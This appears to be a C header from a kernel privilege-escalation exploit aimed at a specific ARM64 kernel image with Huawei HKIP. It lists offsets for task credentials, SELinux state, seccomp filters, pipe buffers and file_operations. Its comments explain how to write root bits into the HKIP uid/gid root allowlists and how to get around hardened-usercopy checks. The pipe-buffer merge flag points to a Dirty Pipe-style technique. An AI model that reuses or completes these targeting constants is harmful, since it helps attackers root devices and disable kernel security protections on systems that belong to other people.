#define TASK_TASKS_OFF 0x538
#define TASK_FILES_OFF 0x830
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8a8
/*
 * hkip_check_xid_root / cap_vm_enough_memory / generic_permission:
 * ldr wN, [current, #1600] is task->pid (copy_process stores pid_nr
 * here and at +1604).  pid==0 is the idle skip; do not zero it or
 * do_exit panics.  Allowlist via hkip_uid_root_bits[pid].
 * Audit loginuid is a different field at +2216.
 */
#define TASK_HKIP_XID_OFF 1600
#define TASK_HKIP_XID2_OFF 1604
/*
 * From this image's own symbol table (ref/nop_syms.txt):
 *   ffffffc014370000 o hkip_uid_root_bits
 *   ffffffc014371000 o hkip_gid_root_bits
 * i.e. 0x04370000 / 0x04371000.  The previous 0x042b0000 was 0xC0000 short and
 * had never been referenced, so nothing caught it; using it would have written
 * 64 root bits into an unrelated .bss page.  Cross-checked against two symbols
 * that ARE in use and do match their constants: selinux_blob_sizes
 * (0x2821088 == SELINUX_BLOB_SIZES_OFF) and selinux_state
 * (0x3ebb068 == SELINUX_ENFORCING_OFF).
 */
#define HKIP_UID_ROOT_BITS_OFF 0x04370000ULL
#define HKIP_GID_ROOT_BITS_OFF 0x04371000ULL
#define HKIP_UID_ROOT_BITS (KIMAGE_TEXT_BASE + HKIP_UID_ROOT_BITS_OFF)
#define HKIP_GID_ROOT_BITS (KIMAGE_TEXT_BASE + HKIP_GID_ROOT_BITS_OFF)
#define FILES_FDT_OFF 0x20
#define FDT_FD_OFF 0x08
#define FILE_PRIVATE_DATA_OFF 0xd0

#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 36
#define CRED_CAPS_OFF 40
#define CRED_SECURITY_OFF 120
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 512
/* HARDENED_USERCOPY: configfs_read_file -> simple_read_from_buffer
 * checks PageSlab.  Do not scan 0x400 across a 0x3c0 mm_struct. */
#define PIPE_SCAN_CHUNK 0x80
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_READERS_WRITERS_OFF 0x70
#define PIPE_BUFS_OFF 0x90

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
